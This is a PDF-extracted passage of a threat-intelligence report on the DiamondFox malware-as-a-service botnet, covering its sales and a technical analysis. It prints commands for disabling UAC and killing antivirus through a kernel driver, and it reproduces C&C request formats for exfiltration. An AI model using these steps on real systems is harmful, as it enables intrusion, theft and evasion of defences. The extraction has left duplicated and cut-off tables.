This provides unskilled threat actors an easy entrance to\nthe cyberattack world, and enables each user to start their own attack campaign without any technical knowledge. Drive-by\nattack methods, ransomware, banking Trojans and a variety of attack tools are now traded in underground forums and use a\nwide range of payment methods.\n\nDiamondFox, a modular botnet offered for sale on various underground forums, is an outstanding demonstration of the many\nadvantages of this business module. By purchasing a single product, the buyer is granted access to a variety of capabilities,\nin the form of plugins, and can plan and execute multiple campaigns: a tailored espionage campaign, a credentials theft\ncampaign, which can be the basis of an extensive monetary theft operation, and even a simple, yet highly effective distributed\ndenial of service (DDoS) attack.\n\nTogether with TerbiumLabs, a Dark Web Data Intelligence company, we reviewed the DiamondFox malware’s capabilities,\nsales procedure and user experience. This report also includes a full technical analysis of the malware’s functionality,\nnetwork communications and multiple plugins.\n\n#### DiamondFox Malware Ecosystem\n\nLooking at the full list of capabilities of the latest version of DiamondFox, the Crystal version, this highly modular malware\nseems to cover everything from keylogging and browser password stealing, all the way to a variety of Distributed Denial of\nService (DDoS) attack techniques through crypto currency wallet stealing. DiamondFox, one of the trendiest malware-as-aservice offered for sale these days, is in fact a one-stop-shop: upon purchasing the malware for a certain period, a selection of\nplugins becomes accessible. All that’s left for the buyer to do is to choose which one to activate for each victim, and when.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n_Figure 1: DiamondFox advertisement, dated April 2016_\n\nThe ad displayed above, which presents the latest version of DiamondFox, includes a detailed explanation about the malware\nloader, the user panel and the actual core of DiamondFox – the plugins. It also includes a carefully updated Changelog, which\nprovides the potential buyers a detailed explanation about the improvements and features added to each of the versions.\n\nAt this point, after examining the highly successful Cerber Ransomware-as-a-service and the user-friendly Sundown Exploit\nKit, there is no need to elaborate about the management panel granted to each user who purchases the malware. It goes with­\nout saying that the DiamondFox user panel is comprehensive and secured, and provides users real-time infection statistics as\nwell as control over the activation of the plugins. Moreover, most of the DiamondFox advertisements guarantee free updates\nand support.\n\n\n_Figure 1: DiamondFox advertisement, dated April 2016_\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n_Figure 2: DiamondFox user panel screenshots_\n\n_Figure 3: DiamondFox user panel screenshots, DDoS panel_\n\n\n_Figure 2: DiamondFox user panel screenshots_\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n_Figure 4: DiamondFox user panel screenshots, single victim view_\n\nSo far, the DiamondFox botnet seems like the perfect solution for any actors seeking an easy way to initiate their own cam­\npaigns. DiamondFox offers a range of plugins, which provide the user several data theft possibilities, and the ability to\nself-spread via removable devices and social networks. DiamondFox can definitely be used as the basis of a monetary theft\noperation, or a tailored espionage campaign. Furthermore, it appears that the official malware vendor, an actor dubbed\n_‘Edbitss’, is truly invested in the improvement of the malware, as all updates, changes and fixes are carefully documented and_\nshared with the potential buyers. Edbitss is clearly very responsive in all of the observed threads. Several customer reviews\nvalidate this impression and describe a quality, fully functioning product:\n\n\n_Figure 4: DiamondFox user panel screenshots, single victim view_\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n_Figure 6: DiamondFox customer review_\n\n_Figure 7: DiamondFox customer review_\n\n_Figure 8: DiamondFox customer review_\n\nWe can’t help but wonder which side is telling the truth.\n\nAs mentioned previously, Edbitss is the official DiamondFox vendor, based on evidence from the ads referred to in this report.\nThe actor uses the same Jabber address in all of the observed ads, both on the clear web and on the Darknet: edbitss@blah.\nim. However, different contact details were observed throughout the various ads, each using a top level domain linking the\nactor to another country. The actor claims to be located in Russia and appears to be fluent in Russian. However during the\ninvestigation, we came across a clear web landing page established by the actor in March 2016, on the domain ‘blogspot.mx’,\nthe Mexican website of the highly popular blog-publishing service. From this, we believe that the actor lives in Mexico.\n\n\n_Figure 6: DiamondFox customer review_\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\nOne might expect DiamondFox’s sales methods would reflect its diversity, and each of the plugins would be uniquely priced\nbased on its complexity and potential value to the threat actor. In reality, after examining several different advertisements both\non the Darknet and clear web, we can state that that is only partially the case. In the pricing section of one of the ads observed\non a Darknet forum, last modified in late January 2017, we can see that the malware is priced at $300, the builder is priced\nat $700, and one of the plugins is sold for $150.– The plugin which appears in the ad is described as the ‘RDP/filemanager’\nplugin. We estimate that the plugin mentioned in the pricing section is the Remote Desktop plugin, responsible for starting/\nstopping RDP sessions.\n\nInterestingly, on the clear web forum rekings.com, the malware is priced at a single sum of $826.\n\n_Figure 9: DiamondFox advertisement, dated April 2016_\n\n#### Technical Description\n\n##### MALWARE FUNCTIONALITY AND PAYLOAD\n\nThe DiamondFox malware has a complex modular architecture in which the modules interact with each other serially.\n\nThe infrastructure is mainly responsible for loading, evasion, persistence, elevation of privileges and C&C communications,\nwhile the malicious functionality is provided by the DiamondFox plugins.\n\nThe flowchart on the next page presents an overview of the various DiamondFox modules and their interactions.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n### LOADER PLUGIN\n\n##### FileZilla FTP\n Mail PassView\n\n### LOADING Browser PassView\n\n##### RDP PassView\n\n### MAIN Messenger PassView\n\n_•_ Unique Identifier VNC PassView\n\nGeneration\n\n##### Screenshots\n\n_•_ Configuration\n\n### STARTUP\n\nSection Decryption SPAM Sender\n\n_•_ Anti VM Checks\n\n##### Home Page Hijacker\n\n_•_ Execution Pivoting\n\n_•_ 2nd UAV Bypass Persistance INFORMATION Social Network\n\n_•_ Gather Infected COLLECTION DDoS\n\nComputer POS Ram Scrapper\nInformation and\nStatistics Remote Task\n\n_•_ Initial INITIALIZATION Remote Desktop\n\nCommunication Keylogger\nwith C&C Server\n\n_•_ Execution of Watchdog\n\nSeveral Plugins\n\n##### Crypto Wallet\n\n### MAIN LOOP\n\n##### Clipboard BitCoin\n\n Removable Drive\n\n_Figure 10: DiamondFox Modules and Interactions_\n\n###### Configuration Section\n\nDiamondFox includes an embedded configuration section which contains values used to determine the workflow of the\nmalware, to store the decryption keys and to perform other tasks.\n\nThe keys contained within the configuration section are used throughout the entire malware execution, and a large portion of\nthe malware's functionality is determined by their values.\n\nThe configuration section is stored within a specific PE section named L!NK. During the startup stage, this PE section is copied\ninto a newly allocated buffer. It is composed of key/value pairs which have the following structure:\n\n\n### LOADER PLUGIN\n\n##### FileZilla FTP\n Mail PassView\n\n### LOADING Browser PassView\n\n##### RDP PassView\n\n### MAIN Messenger PassView\n\n_•_ Unique Identifier VNC PassView\n\nGeneration\n\n##### Screenshots\n\n_•_ Configuration\n\n### STARTUP\n\nSection Decryption SPAM Sender\n\n_•_ Anti VM Checks\n\n##### Home Page Hijacker\n\n_•_ Execution Pivoting\n\n_•_ 2nd UAV Bypass Persistance INFORMATION Social Network\n\n_•_ Gather Infected COLLECTION DDoS\n\nComputer POS Ram Scrapper\nInformation and\nStatistics Remote Task\n\n_•_ Initial INITIALIZATION Remote Desktop\n\nCommunication Keylogger\nwith C&C Server\n\n_•_ Execution of Watchdog\n\nSeveral Plugins\n\n##### Crypto Wallet\n\n### MAIN LOOP\n\n##### Clipboard BitCoin\n\n Removable Drive\n\n_Figure 10: DiamondFox Modules and Interactions_\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n\n**DiamondFox Configuration Section**\n\n\n<Configs uid=%uid%>\npa>1<pa\noi>%encrypted_data%<oi\npm>1<pm\n...\n</Configs>\n\n\n###### DiamondFox Operational Files\n\nAs DiamondFox is a highly modular malware, its operating environment is composed of a bundle of files, each used to support a\nspecific functionality:\n\n- Store the encrypted version of some plugins.\n\n- Store the configuration for some plugins.\n\n- Store the output of some plugins.\n\nThis bundle, and the functionality supported by each file, is described in Appendix A – Purpose of Files.\n\n###### Loader\n\nThe loader module is the first module executed after unpacking. It is responsible for preparing the system for the execution of\nthe main malware logic. The main functionality contained within the loader module is:\n\n- UAC Bypass – Elevate privileges and allow full execution with administrator rights using a well-known UAC bypass\n\ntechnique.\n\n- Evasion – Perform various Anti-VM and Anti-Virus detection checks to make sure that the execution is not contained within an\n\nemulation or research environment, and to disable and remove Anti-Virus software.\n\n- Hide UI – Make sure several UI side effects are turned off (i.e. balloon pop-ups are disabled at this stage).\n\nOnce all of these actions have taken place, the loader starts a new application in a suspended state. The main module image is\nmapped into the memory space and the process is resumed, transferring the execution to the main module.\n\n###### Main Module\n\nThis module is the core of the DiamondFox botnet. It is written and compiled in pure Visual Basic 6, and contains all the internal\nlogic of the malware infrastructure. The main module is also responsible for the execution of the DiamondFox plugins. The\nmain module's functionality is divided into several sub-modules described below:\n\n**Startup**\n\nThe startup sub-module has several responsibilities:\n\n- Unique identifier generation – A unique identifier referred to as VOLUME_SERIAL_NUMBER is generated. This value is\n\nlater used for emulation environment detection. The generation algorithm for this value is described in detail in\n**Appendix A – Plugins.**\n\n- Configuration section decryption.\n\n- Several Anti-VM checks, detailed in Protection Mechanisms.\n\n- Pivot the execution to a different process / location on the disk.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n- Verify that the malware was not yet executed on the infected machine by checking a specific mutex.\n\n- Elevation of privileges – Allows execution using administrative rights by utilizing a non-advanced UAC bypass technique.\n\n- Activate or deactivate the Hosts Spoofing plugin and clean the environment from a previous DiamondFox run, depending on\n\nthe enabled configuration flags.\n\n- Persistence – The module makes sure that if the computer reboots or shuts down, the malware will be automatically started.\n\nThis option is configurable.\n\n**Configuration Section Decryption**\n\nThe entire configuration section is embedded into the original binary file and is stored in an encrypted form. The encryption is\ncomposed of two separate layers:\n\n- Upper layer decryption algorithm\n\n- Lower level decryption algorithm\n\nThe decryption algorithms are described in Appendix B – Configuration Section Decryption.\n\n**Execution Pivoting**\n\nAt this stage, DiamondFox copies itself into a configurable location on the file system. The newly created file is then executed\nand the entire malware functionality is pivoted to it.\n\nBoth the file system location and the file name are defined in the configuration section (under the values\n%MAIN_DIR%\\EXE_DIR and EXE_NAME, respectively). The default file system location is %TEMP%\\EXE_DIR.\n\n**UAC Bypass**\n\nFor the malware to execute under administrative privileges, the operating system’s UAC protection must be bypassed.\n\nEven though a known UAC bypass technique was already applied in the Loader stage, this module contains another, less\ntechnical, module to achieve similar results. The execution of this technique is optional and depends on a value located in the\nconfiguration section.\n\n(The appearance of redundant functionality in DiamondFox may indicate that each of these modules was developed\nindependently).\n\nBefore activating the UAC bypass functionality, the startup module checks if it already has Administrator privileges by using the\nIsUserAnAdmin API call.\n\nIf the check fails, the malware uses a ‘poor-man’s’ technique, in which it continually creates new instances of itself using\nAdministrator rights, hoping the user will eventually click the Yes button on the UAC window to avoid this annoyance. The\npseudo code of the elevation technique can be found on the Protection Mechanisms section.\n\nIf the malware already has Administrator privileges, the UAC protection is disabled by setting the following register keys:\n\n\nHKLM\\Software\\Microsoft\\Security Center\\UACDisableNotify = REG_DWORD:0\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA = REG_DWORD:0\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n**Information Collection**\n\nThis sub-module is responsible for collecting general information about the infected computer. The collected information\nis appended as a '|' delimited string. The information string is then encrypted using a key (NET_XOR_KEY) defined in the\nconfiguration section. This encrypted string will later be sent to the C&C server.\n\nThe following table details the information that is collected from the infected machine:\n\n**Value** **Description**\n\n%COMPUTERNAME% Computer name\n\nselect * from AntivirusProduct from Anti-Virus product name\nwinmgmts:\\\\.\\root\\SecurityCenter(2)?\n\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName Windows OS version\n\nVOLUME_SERIAL_NUM Volume serial number\n\n`L!NK` Build Information Version\n\n%USERNAME% User name\n\nselect * from win32_ComputerSystem Total physical memory in gigabytes\n\nwin32_Processor Processor Name\n\nwin32_VideoController Video controller Caption\n\n%HOMEDRIVE% Disk Size Home drive disk size in gigabytes\n\nlen(%PROCESSOR_ARCHITEW6432%) == 0 Operating system bitness\n\n1 or 0 Unknown\n\nselect * from win32_Battery Is Laptop\n\n%USERDOMAIN% User domain\n\nThe configuration string encryption process is described in the Collected Information String Encryption Algorithm, which\nappears in Appendix B – Information Collection.\n\n**Initialization**\n\nThe initialization module is responsible for two major functionalities:\n\n- Initial communication with the C&C server\n\n- Execution of these plugins\n\n— Keylogger Plugin\n— Watchdog Plugin\n— Password Stealer Plugin\n— Crypto Wallet Stealer Plugin\n\nMore information about the plugins can be found in Appendix A – Plugins.\n\nThe first C&C communication takes place during this stage, in which an initial communication channel is established and the\ninformation gathered during the Information Collection stage is sent to the C&C server.\n\nAll Password Stealer plugins used in this stage share a common execution procedure. The initialization sub-module executes\nall plugins using their predefined index from 0-5. Plugins are executed with the following command line: /stext \"%u.c\" % pl_id.\nThis is used to channel their output into a file. The plugin checks for the creation of each output file at an interval of 5 seconds.\nThe file content is then sent to the C&C server using the File Upload request.\n\n|Value|Description|\n|---|---|\n|%COMPUTERNAME%|Computer name|\n|select * from AntivirusProduct from winmgmts:\\\\.\\root\\SecurityCenter(2)?|Anti-Virus product name|\n|HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName|Windows OS version|\n|VOLUME_SERIAL_NUM|Volume serial number|\n|L!NK|Build Information Version|\n|%USERNAME%|User name|\n|select * from win32_ComputerSystem|Total physical memory in gigabytes|\n|win32_Processor|Processor Name|\n|win32_VideoController|Video controller Caption|\n|%HOMEDRIVE% Disk Size|Home drive disk size in gigabytes|\n|len(%PROCESSOR_ARCHITEW6432%) == 0|Operating system bitness|\n|1 or 0|Unknown|\n|select * from win32_Battery|Is Laptop|\n|%USERDOMAIN%|User domain|\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n**Main Loop**\n\nThe main loop is an infinite loop used to schedule and execute these repeatable actions:\n\n- Repeatable C&C communication – Used mainly to receive commands and download additional plugins.\n\n- Persistence – Actions required to keep DiamondFox persistent over system reboots. Takes place in 30 second intervals.\n\n- Plugin actions – Several DiamondFox plugins require the performance of repeatable actions. Those plugins are activated and\n\nregistered within the main loop. They include\n— Bitcoin Address Spoofing\n— Screenshots Plugin\n— Plugin 13 – this plugin's functionality is unknown\n\n**Repeatable C&C Communication**\n\nThe repeatable C&C communications performed within the main loop include several major functionalities:\n\n- A Command Query Packet is sent in a configurable interval that can be defined in the configuration section. The command\n\nquery packet checks whether C&C server has any pending commands to be executed by the bot. If it does, the commands\nare executed.\n\n- The content of the Keylogger plugin output file (keys.c) is sent to the C&C server using the File Upload request.\n\n- Hosts spoofing actions are performed, in case the plugin is enabled.\n\n###### Plugins\n\nPlugins perform a critical part of the DiamondFox functionality, and the plugin system was designed to be highly modular\nand diverse. The latest DiamondFox version includes over 15 plugins. This section briefly describes the functionality of all of\nDiamond Fox plugins. Additional descriptions for more complex plugins are further detailed in Appendix A.\n\nDiamondFox plugins can be roughly divided into two main categories:\n\n- Embedded Plugins – Plugins that are embedded into the original file.\n\n- Downloadable Plugins – Plugins that can be downloaded from the C&C server upon a specific C&C command.\n\nEach plugin can be in one of these three running states:\n\n- Mandatory – The plugin is always executed.\n\n- Locally Configurable – The plugin execution is dependent on the set of the corresponding flag in the configuration section.\n\n- Remotely Configurable – The plugin execution is dependent on a corresponding command from the C&C server.\n\nThe table on the following page lists the plugins available in the latest version of DiamondFox, which was released in March\n2016. More information on the below plugins can be found in Appendix A – Plugins.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n|ID|Name|Category|C&C Request ID|Hosting Process|Running State|Description|\n|---|---|---|---|---|---|---|\n|0|FileZilla FTP Credentials Stealer|Downloadable|P0 request|Original File|Mandatory|Steals credentials from FileZilla FTP clients.

The table below details the plugin state checks and their corresponding fields in the POST request payload:\n\n**File Present** **Packet Parameters** **Purpose**\n\nOff.c &x=1 Hosts Spoofing plugin is disabled.\n\npos.exe &y=1 Plugin 13 plugin is enabled.\n\nlog.c &z=1 Keylogger plugin is running.\n\nThe entire process of PC Information request generation can be described by the following Python code snippet:\n\n|File Present|Packet Parameters|Purpose|\n|---|---|---|\n|Off.c|&x=1|Hosts Spoofing plugin is disabled.|\n|pos.exe|&y=1|Plugin 13 plugin is enabled.|\n|log.c|&z=1|Keylogger plugin is running.|\n\n\nNET_XOR_KEY = \"6083623a732c8349a16cb9d5b6d84b61\" # taken from configuration\npi = '%s%s%s' % (NET_XOR_KEY[0], NET_XOR_KEY[-1], NET_XOR_KEY[0x0F])\n\nparams = get_add_params() # depending on the files present in the system\nhttp_packet_content = '%s=%s%s' % (pi, enc_pc_info_buff, params)\n\n\nThe C&C server may optionally respond with a command to be executed. In such a case, this data is sent as a base64 encoded\nstring and the command is handled by the Command parsing handler. Parsing and decryption of this response type can be\nachieved using the Bot Packet Decryption Routine code (see Appendix B – Network and Communications).\n\nAs network packet encryption algorithm is not crypto-resistant, it can easily be broken without knowledge of the\nNET_XOR_KEY value from the configuration. A PoC for the above statement, Bot Packet Brute Routine, can also be found in\nAppendix B – Network and Communications.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Command Protocol\n\nCommand protocol is used by the bot to query and receive commands from the C&C server.\n\n#### CLIENT SERVER\n\n###### Command Query\n Packet\n\n Command | Args\n\n Command Query Request\n\nCommand Query Request follows the exact same structure as the PC Information Request, only instead of sending PC\nInformation, CMD_QUERY_ID is sent e changed during the communication using the Command-0 response.\nCMD_QUERY_ID is concatenated with the \"||||||||||||||\" string before it is sent.\n\nThe Command Query request generation process can be described by the following Python code snippet:\n\n\ncmd_query_id = \"||||||||||||||\" + CMD_QUERY_ID\ncmd_query_id_enc = encrypt_pc_info(cmd_query_id)\n\nNET_XOR_KEY = \"6083623a732c8349a16cb9d5b6d84b61\" # taken from configuration\npi = '%s%s%s' % (NET_XOR_KEY[0], NET_XOR_KEY[-1], NET_XOR_KEY[0x0F])\n\nparams = get_add_params() # depending on the files present in the system\nhttp_packet_content = '%s=%s%s' % (pi, cmd_query_id_enc, params)\n\n\n###### Command Reponse\n\nCommands are received as a response for the Command Query packets. This response is a base64 decoded packet and has the\nfollowing format:\n\n\n%cmd_id%|%cmd_args%\n\n\nThe table on the following pages describes all possible C&C commands and their corresponding arguments. Additional\ninformation is in Appendix A – C&C Commands.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n|Command ID|Arguments|Description|\n|---|---|---|\n|0|CMD_QUERY_ID|Set CMD_QUERY_ID to be later used in Command Query packets.|\n|1|URL with executable|Download and execute binary from %cmd_args% URL.

Only one plugin may be requested each time. The requested plugin is defined by its unique plugin number which is\nappended to the HTTP request arguments and follows this logic:\n\n\nURL = '%s?p=%d' % (C&C_ADDR, plugin_number)\n\n\nThe response contains encrypted binary data which is encrypted similarly to the Configuration section, and the same algorithm may\nbe used for its decryption.\n\nNote that the data is decrypted by DiamondFox on demand, depending on the plugin number.\n\n###### Update Request\n\nUpdate Request, also referred to as the U request, is an HTTP GET request sent by the bot to the C&C server to update local\nfile data. Only a single file can be updated at each request. An update request number is appended to the HTTP Request URL\nparameters based on the following logic:\n\n\nURL = '%s?u=%d' % (C&C_ADDR, update_number)\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\nThe response is sent as a base64 encoded data. There are three update options:\n\n**Update** **Filename** **Purpose**\n**Number**\n\n0 email.txt Configuration for the Spam plugin.\n\n1 %WINDIR%\\system32\\drivers\\etc\\hosts New content of hosts file used in the Host Spoofing plugin.\n\n2 win.c Configuration for the Keylogger plugin.\n\n###### C Request\n\nThe C request is an HTTP GET request sent by the bot to the C&C server to send the Remote Task Manager plugin output.\n\nThe request data is appended to the HTTP GET request URL using the following logic:\n\n|Update Number|Filename|Purpose|\n|---|---|---|\n|0|email.txt|Configuration for the Spam plugin.|\n|1|%WINDIR%\\system32\\drivers\\etc\\hosts|New content of hosts file used in the Host Spoofing plugin.|\n|2|win.c|Configuration for the Keylogger plugin.|\n\n\nURL = '%s?c=%s' % (C&C_ADDR, base64encode(taskmgr_info))\n\n\n###### T Request\n\nThe T request is an HTTP GET request sent by the bot to the C&C server to notify the C&C server that the DDoS plugin operation\nhas been completed.\n\nThe request data is appended to the HTTP GET request URL using the following logic:\n\n\nURL = '%s?t=done' % C&C_ADDR\n\n\n###### R Request\n\nThe R Request is an HTTP GET request sent by the bot to the C&C server to send the RDP session id.\n\nThe session id is appended to the HTTP GET request URL using the following logic:\n\n\nURL = '%s?r=%s' % (C&C_ADDR, base64encode(session_id))\n\n\n###### Domain Generation Algorithm\n\nDiamondFox features the possibility of using a Domain Generation Algorithm if the C&C_ADDR configuration value length is\nless than 11 bytes. The DGA algorithm is date-based and is fully configurable by the configuration embedded in the malware\nexecutable.\n\n**The Domain Generation Algorithm snippet code, which describes the DGA logic, can be found in Appendix B – Network and**\n**Communications.**\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n##### PROTECTION MECHANISMS\n\n###### Process Detection\n\nThe loader module checks whether the following processes are currently running: Tcpview.exe; ollydbg.exe; procexp.exe.\n\nIf at least one of them is indeed running, then the loader terminates the execution.\n\n###### UAC Bypass\n\nUAC bypass is used to elevate the current process privileges and obtain administrative rights. It is executed in the loader stage,\nand is one of the first operations done by DiamondFox upon infection.\n\nThe technique used is well known and the flaw which allows it to take place was fixed only from Windows 10 RS2 (15031). The\nbypass starts by creating the Logs directory under the C: drive and executing the following command to change the value of the\nProgramData environment variable. (%ProgramData% originally points to the C:\\ProgramData directory)\n\n\nsetx ProgramData C:\\Logs\n\n\nAfter changing the environment variable, DiamondFox creates the same chain of directories that existed under the original\n%ProgramData% path in the C:\\Logs directory.\n\n\n\\Microsoft\\Windows\\Start Menu\\Programs\\Administrative Tools\n\n\nNext, the malware creates a shortcut file called 'Computer Manager.lnk' that points to the DiamondFox image on disk. The\nshortcut is created in the C:\\Logs\\Microsoft\\Windows\\Start Menu\\Programs\\Administrative Tools directory.\n\nTo start its own executable using Administrator rights, DiamondFox starts the following command:\n\n\n%SYSTEMROOT%\\explorer.exe %SYSTEMROOT%\\System32\\CompMgmtLauncher.exe\n\n\nThe CompMgmtLauncher.exe application starts the 'Computer Manager.lnk' shortcut.\n\nThe problem lies in the fact that it expands the environment variables to do so.\n\nThe full path to the 'Computer Manager.lnk' contains the value of the %ProgramData% environment variable.\n\nAt the end, the value of the %ProgramData% environment variable is restored to its original value:\n\n\n%HOMEDRIVE%\\ProgramData\n\n\nMore information and source code for this UAC bypass technique is described in the UACme project page under technique #24.\n\n###### Manual UAC Bypass\n\nThis section contains pseudo code used by DiamondFox to manually bypass the User Account Control feature. Detailed\ninformation can be found in Appendix B – Protection Mechanisms.\n\nDiamondFox waits until the consent.exe application, which is responsible for the UAC window, is terminated. Further\ninformation can be found on the Process Elevation Check code snippet, which appears in Appendix B – Protection\n**Mechanisms. While examining the code, some applications should be run as Administrator and then the console output should**\nbe checked.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Anti-Virus Detection\n\nThis section describes one of the techniques implemented by DiamondFox to disable Anti-Virus products on infected machines.\n\nIf the malware loader detects that an Anti-Virus processes is running in the system, the following actions take place:\n\n1. Create a %HOMEDRIVE%\\~tmp1310 directory.\n\n2. Drop the Process Hacker driver to the created directory under the name xSafety.sys.\n\n3. Create an entry for the xSafety service using the following command:\n\n\nSC CREATE xSafety DisplayName=xSafety type=kernel binPath=%HOMEDRIVE%\\~tmp1310\\xSafety.sys\nstart=system\n\n4. Upon creation, the service is started using the following command:\n\n\nsc start xsafety\n\n\n5. After the driver was successfully loaded into the kernel space, DiamondFox terminates all processes related to the detected\nsoftware, and stops and removes related services.\n\nThis is done by dropping the Process Hacker executable and starting to pass specific arguments.\n\nThe process termination arguments passed are:\n\n\n-s -c -ctype process -cobject %PROCESSNAME% -caction terminate\n\n\nThe service stop and removal arguments passed are:\n\n\n-s -c -ctype serivce -cobject %SERVICENAME% -caction stop\n-s -c -ctype serivce -cobject %SERVICENAME% -caction delete\n\n\nFor some Anti-Virus products, specific registry keys and directories are removed as well.\n\nBased on the process detailed below, it is clear that the DiamondFox author conducted extensive research. The full list of\ndetected products is in Appendix A.\n\n###### Anti-Emulation\n\nThis section describes some of the techniques implemented by DiamondFox to detect if it is running in emulation\nenvironments. The following checks are performed:\n\n**Emulation Environment** **Action**\n\nMalwr service Compare the VOLUME_SERIAL_NUM with 70144646.\n\nAnubis service Compare the VOLUME_SERIAL_NUM with AC79B241.\n\nVmware Load vmGuestLib.dll DLL.\n\nVBox Load vboxmrxnp.dll DLL.\n\nSandboxie Load SbieDll.dll DLL.\n\nAvast Antivirus Load vsnxhk.dll DLL.\n\nIn addition, DiamondFox also checks the STARTUPINFO structure dwFlags field. If the TARTF_FORCEOFFFEEDBACK (0x80) flag is\nenabled, the execution is terminated.\n\n|Emulation Environment|Action|\n|---|---|\n|Malwr service|Compare the VOLUME_SERIAL_NUM with 70144646.|\n|Anubis service|Compare the VOLUME_SERIAL_NUM with AC79B241.|\n|Vmware|Load vmGuestLib.dll DLL.|\n|VBox|Load vboxmrxnp.dll DLL.|\n|Sandboxie|Load SbieDll.dll DLL.|\n|Avast Antivirus|Load vsnxhk.dll DLL.|\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n##### INDICATORS OF COMPROMISE\n\n###### Static Indicators\n\n**SHA-1 Hashes**\n\n89e99f1f855d311a1e65e897e8f8b756a44d679cd8e2d582a6cbea728f024790\n\n###### File System Detection\n\n**File Name**\n\n%APPDATA%\\com6.{GUID}\\log.c\n\n%APPDATA%\\com6.{GUID}\\win.c\n\n%APPDATA%\\com6.{GUID}\\dwn.exe\n\n%APPDATA%\\com6.{GUID}\\keys.c\n\n%APPDATA%\\com6.{GUID}\\ss.c\n\n%APPDATA%\\pos.exe\n\n%APPDATA%\\output.txt\n\n%APPDATA%\\com6.{GUID}\\Off.c\n\n%APPDATA%\\com6.{GUID}\\email.txt\n\n%APPDATA%\\0.c\n\n%APPDATA%\\1.c\n\n%APPDATA%\\2.c\n\n%APPDATA%\\3.c\n\n%APPDATA%\\4.c\n\n%APPDATA%\\5.c\n\n###### Scheduled Tasks\n\n**Task Name** **Task Run Path** **Schedule Type**\n\nEXE_NAME %APPDATA%\\com6.{GUID}\\EXE_NAME.exe ONLOGON\n\n###### Mutexes\n\n**Mutex Name**\n\nKY-%COMPUTERNAME%\n\nKWLdVfMiNNaUcrAddAaYhTt21NTySR (XOR_KEY from configuration) Main Module\n\n###### C&C Drop and Reporting Servers\n\n|Task Name|Task Run Path|Schedule Type|\n|---|---|---|\n|EXE_NAME|%APPDATA%\\com6.{GUID}\\EXE_NAME.exe|ONLOGON|\n\n|Mutexes|Col2|\n|---|---|\n|Mutex Name|Module|\n|KY-%COMPUTERNAME%|Keylogger Plugin|\n|KWLdVfMiNNaUcrAddAaYhTt21NTySR (XOR_KEY from configuration)|Main Module|\n\n|Server Details|Communication Type|Executing Module|\n|---|---|---|\n|86.110.117.207|HTTP||\n|hxxp://86.110.117.207/home/gate.php|HTTP||\n\n\n-----",
